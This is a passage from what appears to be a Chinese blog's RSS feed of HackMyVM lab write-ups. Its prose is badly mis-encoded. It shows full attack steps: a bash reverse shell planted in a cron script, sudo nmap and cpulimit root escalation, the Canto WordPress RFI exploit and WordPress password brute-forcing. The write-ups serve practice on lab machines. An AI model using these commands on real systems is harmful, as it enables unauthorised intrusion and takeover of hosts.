debug1Ôºöclient_input_hostkeysÔºöÂú® /home/kali/.ssh/known_hosts2 ‰∏≠ÊêúÁ¥¢ 192.168.205.215 / (Êó†)
debug1Ôºöclient_input_hostkeysÔºöhostkeys Êñá‰ª∂ /home/kali/.ssh/known_hosts2 ‰∏çÂ≠òÂú®
debug1Ôºöclient_input_hostkeysÔºöÊ≤°ÊúâÊù•Ëá™ÊúçÂä°Âô®ÁöÑÊñ∞ÂØÜÈí•ÊàñÂºÉÁî®ÁöÑÂØÜÈí•
debug1ÔºöÊ≠£Âú®ÂèëÈÄÅÁéØÂ¢É„ÄÇ
debug1ÔºöÈ¢ëÈÅì 0ÔºöËÆæÁΩÆÁéØÂ¢ÉËØ≠Ë®Ä =‚Äúzh_CN.UTF-8‚Äù
debug1ÔºöÊâøËØ∫Ôºöfork
```

ÂàõÂª∫‰∫Ü‰ºöËØùÔºå‰∏ç‰ºö‰∫ÜÔºåÂéªÁúã‰∫Ü`HGBE`Â§ß‰Ω¨ÁöÑwpÔºåÂéüÊù•ÊòØÈÇ£‰∏™Áº©Â∞èÊèêÊùÉÁöÑÈÇ£‰∏™‰∏úË•øÂïä

![image](https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134)

ËæìÂÖ•`!/bin/bash`Â∞±ÂèØ‰ª•ÊîæÂ§ß‰∫Ü

![image](https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983)

‰ªñÊòØËøôÊ†∑ÂÆûÁé∞ÁöÑÔºåÂèØ‰ª•Â≠¶‰π†‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604)

```bash
dev@Chromatica:~$ ls -al
total 72                                                                                                                             
drwxr-x--- 7 dev  dev  4096 Apr 18  2024 .                                                                                           
drwxr-xr-x 4 root root 4096 Mar 28  2023 ..                                                                                          
-rw------- 1 dev  dev  3467 Apr 24  2024 .bash_history                                                                               
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout                                                                                
-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc                                                                                     
-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh                                                                                      
drwx------ 2 dev  dev  4096 Mar 21  2023 .cache                                                                                      
drwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config                                                                                     
drwx------ 3 dev  dev  4096 Apr 18  2024 .gnupg                                                                                      
-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt                                                                                   
-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst                                                                                    
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile                                                                                    
drwx------ 4 dev  dev  4096 Mar 27  2023 snap                                                                                        
-rw-r--r-- 1 root root   35 May 23  2023 user.txt                                                                                    
drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                                                        
-rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo      
```

`.bash_history`‰ªñÊ≤°Âà†Èô§ÔºåÊàë‰ª¨Áõ¥Êé•ÁúãÂ∞±Â•Ω‰∫Ü

![image](https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2)

ÊÑüÂÖ¥Ë∂£

![image](https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56)

Êàë‰ª¨ÂèØ‰ª•ÊâßË°åËøòÊòØ`analyst`Áî®Êà∑ÁöÑÔºåÊàëÁõ¥Êé•Áî©‰∫Ü‰∏Ä‰∏™ÂèçÂºπshell‰∏äÂéª

```bash
dev@Chromatica:~$ echo 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'' &gt; /opt/scripts/end_of_day.sh
dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'

```

ËÆ©Â≠êÂºπÈ£û‰ºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.215] 58754
bash: cannot set terminal process group (3073): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
analyst@Chromatica:~$ 

```

ÂºπÂõûÊù•‰∫Ü

```bash
analyst@Chromatica:~$ sudo -l
sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap

```

ÂèØ‰ª•‰ΩøÁî®`sudo`ÊùÉÈôêÊâßË°ånmapÔºåÊâìÂºÄ`https://gtfobins.github.io/`Êêú‰∏Ä‰∏ãÂ∞±Êúâ‰∫Ü

![image](https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60)

```bash
analyst@Chromatica:~$ TF=$(mktemp)
TF=$(mktemp)
analyst@Chromatica:~$ echo 'os.execute('/bin/sh')' &gt; $TF
echo 'os.execute('/bin/sh')' &gt; $TF
analyst@Chromatica:~$ sudo nmap --script=$TF
sudo nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-30 06:59 UTC
NSE: Warning: Loading '/tmp/tmp.C0v28yTvbc' -- the recommended file extension is '.nse'.
id
uid=0(root) gid=0(root) groups=0(root)
```

ÊãøÂà∞root‰∫ÜÔºåÂ¶ÇÊûú‰Ω†ËßâÂæó‰∫§‰∫íshell‰∏çÂ•ΩÁî®bash -p ÊàñËÄÖËá™Â∑±ÂÜçÂºπ‰∏Ä‰∏™shellÂõûÊù•Âä†Âõ∫‰∏Ä‰∏ãÂ∞±Â•Ω‰∫Üsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Chromatica.html</guid><pubDate>Fri, 27 Jun 2025 09:32:48 +0000</pubDate></item><item><title>hmv_canto</title><link>https://7r1UMPHK.github.io/post/hmv_canto.html</link><description># hmv_canto

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=canto
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.213
**Êú¨Êú∫** IPÔºö192.168.205.141

---

### **1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã**

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
Nmap scan report for 192.168.205.213
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

---

### **2. Web ÊúçÂä°Êé¢Êµã‰∏éWordpress Plugin CantoËøúÁ®ãÊâßË°åÊºèÊ¥û**

ÂØπ 80 Á´ØÂè£ÊÑüÂÖ¥Ë∂£ÔºåËÆøÈóÆ Web È°µÈù¢ÔºåÊâ´Êèè‰∏Ä‰∏ãÁªìÊûÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ whatweb http://192.168.205.213        
http://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]
                                                                                                
```

ÊòØWordPressÔºåwpscanÂêØÂä®

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.213/ [192.168.205.213]
[+] Started: Sun Dec 29 19:08:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.213/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.205.213/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://192.168.205.213/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.205.213/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.205.213/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.205.213/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.205.213/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Sun Dec 29 19:08:28 2024
[+] Requests Done: 57
[+] Cached Requests: 6
[+] Data Sent: 14.504 KB
[+] Data Received: 236.451 KB
[+] Memory used: 268.914 MB
[+] Elapsed time: 00:00:06
                                                    
```

ÁÑ∂ÂêéÊàëÊãøerikÁàÜÁ†¥‰∫ÜWordPressËøòÁàÜÁ†¥‰∫ÜsshÔºåÈÉΩÊ≤°ÊúâÁªìÊûúÔºåÂõûÂéªÁúã‰∫ÜÁúºÁΩëÈ°µÂèëÁé∞‰ªñÊòØWordPressÔºå‰∏∫‰ªÄ‰πàËµ∑ÂêçCantoËøòÂÜôÁöÑÊúâÊ®°Ê†∑ÊúâÁöÑÔºåÊàëËøò‰ª•‰∏∫ÊòØCMSÂë¢ÔºåÊêúÁ¥¢‰∫Ü‰∏Ä‰∏ãËøô‰∏™ÂêçÂ≠óÁöÑÊºèÊ¥û

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit Canto                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt
Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                           
```

ÁÑ∂ÂêéÊàëÂèëÁé∞Ëøô‰∏ç‰ºöÊòØ‰∏™Êèí‰ª∂ÂêßÔºåÁî®‰∫Ü‰∏Ä‰∏ãphp/webapps/51826.pyÔºåÂèëÁé∞ËøòÁúüÊòØ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit -m php/webapps/51826.py
  Exploit: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /home/kali/test/51826.py

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 51826.py          
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]
51826.py: error: the following arguments are required: -u/--url, -LHOST/--local_host
usage: 51826.py [-h] -u URL [-s SHELL] -LHOST LOCAL_HOST [-LPORT LOCAL_PORT] [-c COMMAND] [-NC_PORT NC_PORT]

Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Vulnerable URL
  -s SHELL, --shell SHELL
                        Local file for web shell
  -LHOST LOCAL_HOST, --local_host LOCAL_HOST
                        Local web server IP
  -LPORT LOCAL_PORT, --local_port LOCAL_PORT
                        Local web server port
  -c COMMAND, --command COMMAND
                        Command to execute on the target
  -NC_PORT NC_PORT, --nc_port NC_PORT
                        Listener port for netcat

    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33

    - Execute a command
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -c 'id'

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -s php-reverse-shell.php
  
                                                                                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141           
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:37:27] 'GET /wp-admin/admin.php HTTP/1.1' 200 -
Server response:
www-data
```

ÂêéÈù¢Â∞±ÊåâÁÖßÊèêÁ§∫‰ΩøÁî®ËÑöÊú¨Â∞±Â•Ω‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 51826.py -u http://192.168.205.213 -LHOST 192.168.205.141 -s index.php
Exploitation URL: http://192.168.205.213/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.205.141:8080&amp;cmd=whoami
invalid local port None
Local web server on port 8080...
192.168.205.213 - - [29/Dec/2024 19:25:16] 'GET /wp-admin/admin.php HTTP/1.1' 200 -

‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888                           
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.213] 57360
Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:24:29 up 20 min,  0 user,  load average: 0.25, 2.51, 3.83
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊàêÂäüÂºπ‰∫ÜÂõûÊù•

### 3.**Ëé∑ÂæóÁ®≥ÂÆö shell**

Ëé∑Âæó‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**ÊèêÊùÉ**

```bash
www-data@canto:/home$ ls -al
total 12
drwxr-xr-x  3 root root     4096 May 12  2024 .
drwxr-xr-x 20 root root     4096 May 12  2024 ..
drwxr-xr--  5 erik www-data 4096 May 12  2024 erik

```

ÂèëÁé∞ÊàëÊúâerikÁöÑËÆøÈóÆÊùÉÈôêÔºåËøõÂéªÊ∫úËææ‰∫Ü‰∏Ä‰∏ã

```bash
www-data@canto:/home/erik$ ls -al
total 36
drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
drwxr-xr-x 3 root root     4096 May 12  2024 ..
lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -&gt; /dev/null
-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
drwx------ 2 erik erik     4096 May 12  2024 .cache
drwxrwxr-x 3 erik erik     4096 May 12  2024 .local
-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
drwxrwxr-x 2 erik erik     4096 May 12  2024 notes
-rw-r----- 1 root erik       33 May 12  2024 user.txt
www-data@canto:/home/erik$ cd notes/
www-data@canto:/home/erik/notes$ ls -al
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day
cat: Day: No such file or directory
www-data@canto:/home/erik/notes$ cat Day1.txt 
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt 
I almost lost the database with my user so I created a backups folder.


ÁøªËØëÔºö

Day1.txt

Á¨¨‰∏ÄÂ§©ÊàëÊõ¥Êñ∞‰∫Ü‰∏Ä‰∫õÊèí‰ª∂ÂíåÁΩëÁ´ô‰∏ªÈ¢ò„ÄÇ

Day2.txt

ÊàëÂ∑ÆÁÇπ‰∏¢Â§±‰∫ÜÁî®Êà∑ÁöÑÊï∞ÊçÆÂ∫ìÔºåÊâÄ‰ª•ÊàëÂàõÂª∫‰∫Ü‰∏Ä‰∏™Â§á‰ªΩÊñá‰ª∂Â§π„ÄÇ
```

Â§á‰ªΩÊñá‰ª∂Â§πÊàëÂæàÊÑüÂÖ¥Ë∂£ÔºåÈÄöÂ∏∏ÂÖ≥‰∫éÁΩëÁ´ôÁöÑÂ∫îËØ•ÈÉΩÂú®`/var/www/`Èáå

```bash
www-data@canto:/var/www$ ls -al
total 16
drwxr-xr-x  3 www-data www-data 4096 May 12  2024 .
drwxr-xr-x 15 root     root     4096 May 12  2024 ..
-rw-------  1 www-data www-data  219 May 12  2024 .bash_history
drwxr-xr-x  5 www-data www-data 4096 Dec 29 11:05 html
www-data@canto:/var/www$ cat .bash_history
cd /var/wordpress
cd /var
cd /wordpress
export TERM=xterm
clear
ls
cd wordpress
cd wordpres
ls
cd backups
ls
clear
ls
ls -la
unzip dbbackup.zip
ls
clear
ls -la
su erik
cd /var/wordpress/backups
ls
cat 12052024.txt
exit

```

Êúâ‰∏™`.bash_history`ÔºåÁ≠îÊ°àÊòæËÄåÊòìËßÅ‰∫Ü`/var/wordpress/backups/12052024.txt`ÔºåÊàêÂäüÁôªÂΩïerikÁî®Êà∑,`sudo -l`‰∏Ä‰∏ã

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit

```

[cpulimit sudo ÊèêÊùÉÊñπÊ≥ï](https://gtfobins.github.io/gtfobins/cpulimit/#sudo)

```bash
erik@canto:~$ sudo cpulimit -l 100 -f /bin/sh
Process 2669 detected
# id
uid=0(root) gid=0(root) groups=0(root)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_canto.html</guid><pubDate>Fri, 27 Jun 2025 09:32:44 +0000</pubDate></item><item><title>hmv_buster</title><link>https://7r1UMPHK.github.io/post/hmv_buster.html</link><description># hmv_buster

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)
**ÈöæÂ∫¶**ÔºöÁªøËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.142
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST
Nmap scan report for 192.168.205.142
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds

```

ÂÖàÁúã**80Á´ØÂè£**Ôºå**22Á´ØÂè£**ÂÄôË°•

# 2.Ë∏©ÁÇπ

![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)
ÊòØ‰∏™**wordPressÔºå**  Êãø**wpscan**Êâ´Êèè‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.142/ [192.168.205.142]
[+] Started: Wed Jan 15 20:13:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.205.142/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.142/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Meta Generator (Passive Detection)
 |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'
 | Confirmed By: Rss Generator (Aggressive Detection)
 |  - http://192.168.205.142/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://192.168.205.142/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] ta0
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&amp;page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] welcome
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 18

[+] Finished: Wed Jan 15 20:13:57 2025
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 13.267 KB
[+] Data Received: 413.04 KB
[+] Memory used: 229.277 MB
[+] Elapsed time: 00:00:07
                                                     
```

‰∏ªË¶ÅÁöÑ‰ø°ÊÅØÊúâ`WordPress 6.7.1`Âíå‰∏§‰∏™Áî®Êà∑Âêç`ta0`„ÄÅ`welcome`Ôºå‰ΩÜÊòØ`WordPress 6.7.1`Ê≤°ÊúâÊºèÊ¥ûÔºåÂè™ÂèØ‰ª•ÁàÜÁ†¥ÂØÜÁ†Å‰∫Ü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

ÔºàÁúÅÁï•Ôºâ

[+] Performing password attack on Xmlrpc against 2 user/s
Trying ta0 / speaker Time: 00:01:37 &lt;=========================================================&gt; (10000 / 10000) 100.00% Time: 00:01:37

[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jan 15 20:18:29 2025
[+] Requests Done: 10142
[+] Cached Requests: 34
[+] Data Sent: 5.147 MB
[+] Data Received: 5.559 MB
[+] Memory used: 278.031 MB
[+] Elapsed time: 00:01:40

```

